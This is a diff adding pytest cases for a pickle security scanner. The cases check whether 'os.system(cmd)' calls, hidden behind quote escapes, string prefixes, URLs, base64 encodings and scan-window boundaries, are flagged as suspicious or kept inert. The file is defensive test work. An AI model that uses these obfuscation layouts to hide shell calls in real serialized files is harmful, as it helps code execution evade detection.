+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+    expected_notice = "parse_incomplete" if protocol == 0 else "literal_scan_truncated"
+    assert any(notice.code == expected_notice for notice in report.notices)
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_bytes_detects_code_after_triple_quote_crossing_overlap_start(protocol: int) -> None:
+    window_chars = 8 * 1024 * 1024
+    step_chars = window_chars - 4096
+    quote = '"""'
+    prefix = "metadata=" + quote
+    literal = (
+        prefix
+        + ("A" * (step_chars - 2 - len(prefix)))
+        + quote
+        + (" " * 5000)
+        + "url = 'https://example.invalid/x';os.system(cmd)"
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"triple-quote-overlap-protocol-{protocol}.pkl",
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    if protocol == 0:
+        assert report.verdict == SafetyVerdict.UNKNOWN
+        assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+        assert any(notice.code == "parse_incomplete" for notice in report.notices)
+    else:
+        assert report.verdict == SafetyVerdict.SUSPICIOUS
+        assert any(
+            finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+            for finding in report.findings
+        )
+        assert any(notice.code == "literal_scan_truncated" for notice in report.notices)
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_bytes_keeps_url_after_overlap_split_escaped_quote_inert(protocol: int) -> None:
+    window_chars = 8192
+    step_chars = window_chars - 4096
+    prefix = "metadata='"
+    literal = (
+        prefix + ("A" * (step_chars - 1 - len(prefix))) + "\\'https://example.invalid/x;os.system(cmd)'" + (" " * 5000)
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"escaped-quote-overlap-protocol-{protocol}.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=window_chars),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_bytes_detects_formatted_url_expression_when_quote_starts_overlap(protocol: int) -> None:
+    literal = ("A" * 4094) + " f'" + ("B" * 5000) + "https://example.invalid/x{os.system(cmd)}'"
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"formatted-quote-overlap-protocol-{protocol}.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+        for finding in report.findings
+    )
+    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)
+
+
+@pytest.mark.parametrize(
+    ("max_chars", "expected_status"),
+    [(8192, ScanStatus.INCONCLUSIVE), (20000, ScanStatus.COMPLETE)],
+)
+def test_scan_bytes_rejects_embedded_prefix_at_overlap(max_chars: int, expected_status: ScanStatus) -> None:
+    literal = ("A" * (4096 - len("xf"))) + "xf'https://example.invalid/path;os.system(cmd)'" + ("B" * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source=f"embedded-prefix-overlap-{max_chars}.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=max_chars),
+    )
+
+    assert report.status == expected_status
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+        for finding in report.findings
+    )
+
+
+@pytest.mark.parametrize("prefix", ["fr", "fR", "Fr", "FR", "rf", "rF", "Rf", "RF"])
+def test_scan_bytes_preserves_formatted_prefix_split_at_overlap(prefix: str) -> None:
+    literal = (
+        ("A" * 4094)
+        + " "
+        + prefix[0]
+        + prefix[1:]
+        + "'https://example.invalid/"
+        + ("x" * 5000)
+        + "{os.system(cmd)}'"
+        + ("B" * 200)
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source=f"split-{prefix}-prefix-overlap.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+        for finding in report.findings
+    )
+
+
+@pytest.mark.parametrize("prefix", ["br", "bR", "Br", "BR", "rb", "rB", "Rb", "RB"])
+def test_scan_bytes_preserves_nonformatted_prefix_split_at_overlap(prefix: str) -> None:
+    literal = (
+        ("A" * 4094)
+        + " "
+        + prefix[0]
+        + prefix[1:]
+        + "'https://example.invalid/"
+        + ("x" * 5000)
+        + ";os.system(cmd)'"
+        + ("B" * 200)
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source=f"split-{prefix}-prefix-overlap.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+def test_scan_bytes_does_not_skip_base64_token_starting_at_overlap() -> None:
+    encoded = base64.b64encode((b"A" * 3069) + b"os.system('id')").decode("ascii")
+    literal = ("!" * 4096) + encoded + (" " * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=pickle.HIGHEST_PROTOCOL),
+        source="base64-token-overlap.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_keeps_base64_payload_in_url_starting_at_overlap_inert() -> None:
+    encoded = base64.b64encode((b"A" * 3069) + b"os.system('id')").decode("ascii")
+    literal = ("!" * 4096) + "https://example.invalid/" + encoded + (" " * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=pickle.HIGHEST_PROTOCOL),
+        source="base64-url-overlap.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+@pytest.mark.parametrize("shift", [-2, -1, 0, 1, 2])
+def test_scan_bytes_preserves_shifted_base64_alignment(protocol: int, shift: int) -> None:
+    encoded = base64.b64encode((b"Q" * 5000) + b"os.system(cmd)" + (b"Z" * 50)).decode("ascii")
+    token_start = 4096 + shift
+    literal = ("." * (token_start - 1)) + "!" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"shifted-base64-{shift}-protocol-{protocol}.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_preserves_shifted_mime_base64_alignment() -> None:
+    encoded = base64.encodebytes((b"Q" * 5000) + b"os.system(cmd)" + (b"Z" * 50)).decode("ascii")
+    literal = ("." * 4093) + "!" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="shifted-mime-base64.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_preserves_shifted_urlsafe_base64_alignment() -> None:
+    encoded = base64.urlsafe_b64encode(b"\xf8" + (b"Q" * 5000) + b"os.system(cmd)" + (b"Z" * 50)).decode("ascii")
+    literal = ("." * 4093) + "!" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="shifted-urlsafe-base64.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_detects_shifted_base64_without_windowing() -> None:
+    encoded = base64.b64encode((b"Q" * 5000) + b"os.system(cmd)" + (b"Z" * 50)).decode("ascii")
+    literal = ("." * 4093) + "!" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="unbounded-shifted-base64.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=30000),
+    )
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_keeps_shifted_base64_url_inert() -> None:
+    encoded = base64.b64encode((b"Q" * 5000) + b"os.system(cmd)" + (b"Z" * 50)).decode("ascii")
+    literal = ("." * 4094) + "https://example.invalid/" + encoded + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="shifted-base64-url.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+def test_scan_bytes_keeps_shifted_benign_base64_clean() -> None:
+    encoded = base64.b64encode((b"Q" * 5000) + b"safe metadata" + (b"Z" * 50)).decode("ascii")
+    literal = ("." * 4093) + "!" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="shifted-benign-base64.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_bytes_resets_base64_alignment_when_url_ends_at_overlap(protocol: int) -> None:
+    encoded = base64.b64encode((b"Q" * 5000) + b"os.system('id')" + (b"Z" * 50)).decode("ascii")
+    url = "https://example.invalid/a"
+    literal = ("." * (4096 - len(url))) + url + "\n" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"url-end-base64-overlap-protocol-{protocol}.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+@pytest.mark.parametrize("url_end_delta", [-1, 0, 1])
+@pytest.mark.parametrize("encoding", ["standard", "mime", "urlsafe"])
+def test_scan_bytes_resets_encoded_alignment_around_removed_url(
+    url_end_delta: int,
+    encoding: str,
+) -> None:
+    payload = (b"Q" * 5000) + b"os.system('id')" + (b"Z" * 50)
+    if encoding == "mime":
+        encoded = base64.encodebytes(payload).decode("ascii")
+    elif encoding == "urlsafe":
+        encoded = base64.urlsafe_b64encode(b"\xf8" + payload).decode("ascii")
+    else:
+        encoded = base64.b64encode(payload).decode("ascii")
+    url = "https://example.invalid/a"
+    url_end = 4096 + url_end_delta
+    literal = ("." * (url_end - len(url))) + url + "\n" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source=f"url-{url_end_delta}-{encoding}-overlap.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_keeps_benign_base64_after_removed_url_clean() -> None:
+    encoded = base64.b64encode((b"Q" * 5000) + b"safe metadata" + (b"Z" * 50)).decode("ascii")
+    url = "https://example.invalid/a"
+    literal = ("." * (4096 - len(url))) + url + "\n" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="benign-url-end-base64-overlap.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+def test_scan_bytes_detects_base64_after_removed_url_without_windowing() -> None:
+    encoded = base64.b64encode((b"Q" * 5000) + b"os.system('id')" + (b"Z" * 50)).decode("ascii")
+    url = "https://example.invalid/a"
+    literal = ("." * (4096 - len(url))) + url + "\n" + encoded + "!" + ("." * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="unbounded-url-end-base64-overlap.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=30000),
+    )
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "base64 os.system"
+        for finding in report.findings
+    )
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+@pytest.mark.parametrize("slash_count", [5, 7, 9])
+def test_scan_bytes_preserves_odd_backslash_parity_at_overlap(protocol: int, slash_count: int) -> None:
+    quote_position = 4097
+    literal = (
+        ("A" * (quote_position - slash_count))
+        + ("\\" * slash_count)
+        + "'https://example.invalid/"
+        + ("x" * 4200)
+        + ";os.system(cmd)'"
+        + ("B" * 5000)
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"odd-backslash-{slash_count}-protocol-{protocol}.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+        for finding in report.findings
+    )
+
+
+@pytest.mark.parametrize("slash_count", [4, 6, 8])
+@pytest.mark.parametrize("quote_shift", [0, 1, 2])
+def test_scan_bytes_preserves_even_backslash_parity_at_overlap(slash_count: int, quote_shift: int) -> None:
+    quote_position = 4096 + quote_shift
+    literal = (
+        ("A" * (quote_position - slash_count))
+        + ("\\" * slash_count)
+        + "'https://example.invalid/"
+        + ("x" * 4200)
+        + ";os.system(cmd)'"
+        + ("B" * 5000)
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source=f"even-backslash-{slash_count}-shift-{quote_shift}.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+def test_scan_bytes_detects_odd_backslash_payload_without_windowing() -> None:
+    quote_position = 4097
+    literal = (
+        ("A" * (quote_position - 5))
+        + ("\\" * 5)
+        + "'https://example.invalid/"
+        + ("x" * 4200)
+        + ";os.system(cmd)'"
+        + ("B" * 5000)
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=4),
+        source="unbounded-odd-backslash.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=30000),
+    )
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_preserves_call_after_cross_window_quoted_url() -> None:
+    literal = "metadata='https://example.invalid/" + ("a" * (8 * 1024 * 1024)) + "';os.system(cmd)"
+
+    report = scan_bytes(
+        pickle.dumps({"code": literal}, protocol=pickle.HIGHEST_PROTOCOL),
+        source="cross-window-url-call.pkl",
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+        for finding in report.findings
+    )
+    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)
+
+
+def test_scan_bytes_keeps_url_crossing_overlap_start_inert() -> None:
+    literal = ("P" * 3000) + "https://example.invalid/" + ("a" * 1500) + "os.system(cmd)" + " " + ("B" * 5000)
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=pickle.HIGHEST_PROTOCOL),
+        source="overlap-start-url.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+@pytest.mark.parametrize("url_separator", [" space ", ";"])
+def test_scan_bytes_keeps_cross_window_quoted_url_content_inert(url_separator: str) -> None:
+    literal = "metadata='https://example.invalid/" + ("a" * 9000) + url_separator + "os.system(cmd)'"
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=pickle.HIGHEST_PROTOCOL),
+        source="cross-window-quoted-url.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)
+
+
+def test_scan_bytes_preserves_call_after_bounded_cross_window_quoted_url() -> None:
+    literal = "metadata='https://example.invalid/" + ("a" * 9000) + " space';os.system(cmd)"
+
+    report = scan_bytes(
+        pickle.dumps({"code": literal}, protocol=pickle.HIGHEST_PROTOCOL),
+        source="bounded-cross-window-url-call.pkl",
+        options=ScanOptions(max_string_literal_scan_chars=8192),
     )
 
     assert report.status == ScanStatus.INCONCLUSIVE
